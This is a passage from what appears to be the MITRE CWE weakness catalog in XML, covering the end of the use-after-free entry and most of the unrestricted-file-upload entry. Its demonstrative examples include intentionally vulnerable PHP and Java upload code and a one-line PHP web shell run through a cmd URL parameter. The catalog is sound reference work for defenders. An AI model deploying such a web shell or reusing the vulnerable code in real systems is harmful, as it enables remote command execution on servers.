               <Reference>CVE-2009-2416</Reference>
               <Description>use-after-free found by fuzzing</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2416</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1837</Reference>
               <Description>Chain: race condition (CWE-362) from improper handling of a page transition in web client while an applet is loading (CWE-368) leads to use after free (CWE-416)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1837</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0749</Reference>
               <Description>realloc generates new buffer and pointer, but previous pointer is still retained, leading to use after free</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0749</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-3328</Reference>
               <Description>Use-after-free in web browser, probably resultant from not initializing memory.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-3328</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5038</Reference>
               <Description>use-after-free when one thread accessed memory that was freed by another thread</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5038</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0077</Reference>
               <Description>assignment of malformed values to certain properties triggers use after free</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0077</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4434</Reference>
               <Description>mail server does not properly handle a long header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-4434</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-2753</Reference>
               <Description>chain: integer overflow leads to use-after-free</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-2753</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4997</Reference>
               <Description>freed pointer dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-4997</Link>
            </Observed_Example>
         </Observed_Examples>
         <Affected_Resources>
            <Affected_Resource>Memory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
		   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <Entry_ID>Part 4-1</Entry_ID>
			 <Entry_Name>Req SI-1</Entry_Name>
		   </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Use After Free</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Using freed memory</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MEM00-C</Entry_ID>
               <Entry_Name>Allocate and free memory in the same module, at the same level of abstraction</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MEM01-C</Entry_ID>
               <Entry_Name>Store a new value in pointers immediately after free()</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MEM30-C</Entry_ID>
               <Entry_Name>Do not access freed memory</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP15</Entry_ID>
               <Entry_Name>Faulty Resource Use</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 8: C++ Catastrophes.&#34; Page 143"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>KDM Analytics</Modification_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Common_Consequences, Description, Observed_Examples, Other_Notes, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships, Taxonomy_Mappings, White_Box_Definitions</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Description, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
            <Contribution Type="Feedback">
               <Contribution_Name>Anonymous External Contributor</Contribution_Name>
               <Contribution_Date>2022-06-28</Contribution_Date>
               <Contribution_Comment>Suggested rephrase for extended description</Contribution_Comment>
            </Contribution>
			<Contribution Type="Content">
			  <Contribution_Name>participants in the CWE ICS/OT SIG 62443 Mapping Fall Workshop</Contribution_Name>
			  <Contribution_Date>2023-11-14</Contribution_Date>
			  <Contribution_Version>4.14</Contribution_Version>
			  <Contribution_ReleaseDate>2024-02-29</Contribution_ReleaseDate>
			  <Contribution_Comment>Contributed or reviewed taxonomy mappings for ISA/IEC 62443</Contribution_Comment>
			</Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="434" Name="Unrestricted Upload of File with Dangerous Type" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product allows the attacker to upload or transfer files of dangerous types that can be automatically processed within the product's environment.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="351" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="436" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="430" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
               <Description>This can be primary when there is no check at all.</Description>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
               <Description>This is frequently resultant when use of double extensions (e.g. ".php.gif") bypasses a sanity check.</Description>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
               <Description>This can be resultant from client-side enforcement (CWE-602); some products will include web script in web clients to check the filename, without verifying on the server side.</Description>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Name="ASP.NET" Prevalence="Sometimes"/>
            <Language Name="PHP" Prevalence="Often"/>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Sometimes"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Unrestricted File Upload</Term>
               <Description>Used in vulnerability databases and elsewhere, but it is insufficiently precise. The phrase could be interpreted as the lack of restrictions on the size or number of uploaded files, which is a resource consumption issue.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Arbitrary code execution is possible if an uploaded file is interpreted and executed as code by the recipient. This is especially true for .asp and .php extensions uploaded to web servers because these file types are often treated as automatically executable, even when file system permissions do not specify execution. For example, in Unix environments, programs typically cannot run unless the execute bit is set, but PHP programs may be executed by the web server without directly invoking them on the operating system.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Generate a new, unique filename for an uploaded file instead of using the user-supplied filename, so that no external input is used at all.[REF-422] [REF-423]</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Consider storing the uploaded files outside of the web document root entirely. Then, use other mechanisms to deliver the files dynamically. [REF-423]</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>For example, limiting filenames to alphanumeric characters can help to restrict the introduction of unintended file extensions.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Define a very limited set of allowable extensions and only generate filenames that end in these extensions. Consider the possibility of XSS (CWE-79) before allowing .html or .htm file types.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Ensure that only one extension is used in the filename. Some web servers, including some versions of Apache, may process files based on inner extensions so that "filename.php.gif" is fed to the PHP interpreter.[REF-422] [REF-423]</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When running on a web server that supports case-insensitive filenames, perform case-insensitive evaluations of the extensions that are provided.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Do not rely exclusively on sanity checks of file contents to ensure that the file is of the expected type and size. It may be possible for an attacker to hide code in some file segments that will still be executed by the server. For example, GIF images may contain a free-form comments field.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Do not rely exclusively on the MIME content type or filename attribute when determining how to render a file. Validating the MIME content type and ensuring that it matches the extension is only a partial solution.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code intends to allow a user to upload a picture to the web server. The HTML code that drives the form on the user end has an input field of type "file".</Intro_Text>
               <Example_Code Nature="Good" Language="HTML">
                  <xhtml:div>&lt;form action="upload_picture.php" method="post" enctype="multipart/form-data"&gt;<xhtml:br/>
                     <xhtml:br/>Choose a file to upload:<xhtml:br/>&lt;input type="file" name="filename"/&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="submit" name="submit" value="Submit"/&gt;<xhtml:br/>
                     <xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Once submitted, the form above sends the file to upload_picture.php on the web server. PHP stores the file in a temporary location until it is retrieved (or discarded) by the server side code. In this example, the file is moved to a more permanent pictures/ directory.</Body_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>// Define the target location where the picture being</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// uploaded is going to be saved.</xhtml:i>
                     <xhtml:br/>$target = "pictures/" . basename($_FILES['uploadedfile']['name']);<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// Move the uploaded file to the new location.</xhtml:i>
                     <xhtml:br/>if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target))<xhtml:br/>{<xhtml:div style="margin-left:1em;">echo "The picture has been successfully uploaded.";</xhtml:div>}<xhtml:br/>else<xhtml:br/>{<xhtml:div style="margin-left:1em;">echo "There was an error uploading the picture, please try again.";</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The problem with the above code is that there is no check regarding type of file being uploaded. Assuming that pictures/ is available in the web document root, an attacker could upload a file with the name:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>malicious.php</xhtml:div>
               </Example_Code>
               <Body_Text>Since this filename ends in ".php" it can be executed by the web server. In the contents of this uploaded file, the attacker could use:</Body_Text>
               <Example_Code Nature="Attack" Language="PHP">
                  <xhtml:div>&lt;?php<xhtml:div style="margin-left:1em;">system($_GET['cmd']);</xhtml:div>
                     <xhtml:br/>?&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Once this file has been installed, the attacker can enter arbitrary commands to execute using a URL such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l</xhtml:div>
               </Example_Code>
               <Body_Text>which runs the "ls -l" command - or any other type of command that the attacker wants to specify.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-22">
               <Intro_Text>The following code demonstrates the unrestricted upload of a file with a Java servlet and a path traversal vulnerability. The action attribute of an HTML form is sending the upload file request to the Java servlet.</Intro_Text>
               <Example_Code Nature="Good" Language="HTML">
                  <xhtml:div>&lt;form action="FileUploadServlet" method="post" enctype="multipart/form-data"&gt;<xhtml:br/>
                     <xhtml:br/>Choose a file to upload:<xhtml:br/>&lt;input type="file" name="filename"/&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="submit" name="submit" value="Submit"/&gt;<xhtml:br/>
                     <xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>When submitted the Java servlet's doPost method will receive the request, extract the name of the file from the Http request header, read the file contents from the request and output the file to the local upload directory.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public class FileUploadServlet extends HttpServlet {<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                        <xhtml:div>...<xhtml:br/>
                           <xhtml:br/>protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {<xhtml:br/>
                           <xhtml:div style="margin-left:1em;">
                              <xhtml:div>response.setContentType("text/html");<xhtml:br/>PrintWriter out = response.getWriter();<xhtml:br/>String contentType = request.getContentType();<xhtml:br/>
                                 <xhtml:br/>// the starting position of the boundary header<xhtml:br/>int ind = contentType.indexOf("boundary=");<xhtml:br/>String boundary = contentType.substring(ind+9);<xhtml:br/>
                                 <xhtml:br/>String pLine = new String();<xhtml:br/>String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value<xhtml:br/>
                                 <xhtml:br/>// verify that content type is multipart form data<xhtml:br/>if (contentType != null &amp;&amp; contentType.indexOf("multipart/form-data") != -1) {<xhtml:br/>
                                 <xhtml:div style="margin-left:1em;">
                                    <xhtml:div>// extract the filename from the Http header<xhtml:br/>BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));<xhtml:br/>...<xhtml:br/>pLine = br.readLine();<xhtml:br/>String filename = pLine.substring(pLine.lastIndexOf("\\"), pLine.lastIndexOf("\""));<xhtml:br/>...<xhtml:br/>
                                       <xhtml:br/>// output the file to the local upload directory<xhtml:br/>try {<xhtml:div style="margin-left:1em;">
                                          <xhtml:div>BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));<xhtml:br/>for (String line; (line=br.readLine())!=null; ) {<xhtml:div style="margin-left:1em;">if (line.indexOf(boundary) == -1) {<xhtml:div style="margin-left:1em;">bw.write(line);<xhtml:br/>bw.newLine();<xhtml:br/>bw.flush();</xhtml:div>}</xhtml:div>} //end of for loop<xhtml:br/>bw.close();</xhtml:div>
                                       </xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:br/>} catch (IOException ex) {...}<xhtml:br/>// output successful upload response HTML page</xhtml:div>
                                 </xhtml:div>}<xhtml:br/>// output unsuccessful upload response HTML page<xhtml:br/>else<xhtml:br/>{...}</xhtml:div>
                           </xhtml:div>}<xhtml:div style="margin-left:1em;">...</xhtml:div>
                        </xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not perform a check on the type of the file being uploaded (CWE-434). This could allow an attacker to upload any executable file or other file with malicious code.</Body_Text>
               <Body_Text>Additionally, the creation of the BufferedWriter object is subject to relative path traversal (CWE-23). Since the code does not check the filename that is provided in the header, an attacker can use "../" sequences to write to files outside of the intended directory. Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS (CWE-79), or system crash.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2023-5227</Reference>
